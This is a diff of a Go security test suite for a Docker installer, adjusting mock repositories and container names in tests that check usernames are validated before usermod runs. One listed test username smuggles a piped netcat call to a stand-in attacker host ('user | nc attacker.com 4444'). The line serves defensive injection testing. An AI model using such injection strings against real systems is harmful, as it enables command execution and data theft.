@@ -1,6 +1,7 @@
 package docker_test
 
 import (
+	"fmt"
 	"strings"
 
 	. "github.com/onsi/ginkgo/v2"
@@ -25,7 +26,7 @@ var _ = Describe("Docker Installer Security Tests", func() {
 			Commands:          []string{},
 			InstallationState: make(map[string]bool),
 		}
-		mockRepo = &mocks.MockRepository{}
+		mockRepo = mocks.NewMockRepository()
 		installer = docker.New()
 		originalExec = utils.CommandExec
 		utils.CommandExec = mockExec
@@ -119,7 +120,9 @@ var _ = Describe("Docker Installer Security Tests", func() {
 				"user | nc attacker.com 4444",
 			}
 
-			for _, username := range dangerousUsernames {
+			for i, username := range dangerousUsernames {
+				// Create a fresh mock repo for each test to avoid conflicts
+				testRepo := mocks.NewMockRepository()
 				securityExec := &SecurityTestExecutor{
 					MockCommandExecutor: &mocks.MockCommandExecutor{
 						FailingCommands:   make(map[string]bool),
@@ -135,7 +138,10 @@ var _ = Describe("Docker Installer Security Tests", func() {
 
 				utils.CommandExec = securityExec
 
-				err := installer.Install("docker run --name test-container redis", mockRepo)
+				// Use unique container name for each test to avoid repository conflicts
+				containerName := fmt.Sprintf("test-container-%d", i)
+				command := fmt.Sprintf("docker run --name %s redis", containerName)
+				err := installer.Install(command, testRepo)
 				Expect(err).ToNot(HaveOccurred())
 
 				// Verify that no usermod command was executed with dangerous username
@@ -148,6 +154,8 @@ var _ = Describe("Docker Installer Security Tests", func() {
 	Context("Security Regression Prevention", func() {
 		It("should always validate usernames before usermod execution", func() {
 			// This test ensures username validation is consistently applied
+			// Create a fresh mock repo for this test to avoid conflicts
+			testRepo := mocks.NewMockRepository()
 			securityExec := &SecurityTestExecutor{
 				MockCommandExecutor: &mocks.MockCommandExecutor{
 					FailingCommands:   make(map[string]bool),
@@ -163,7 +171,7 @@ var _ = Describe("Docker Installer Security Tests", func() {
 
 			utils.CommandExec = securityExec
 
-			err := installer.Install("docker run --name test-container redis", mockRepo)
+			err := installer.Install("docker run --name test-regression-container redis", testRepo)
 			Expect(err).ToNot(HaveOccurred())
 
 			// The malicious username should never reach usermod
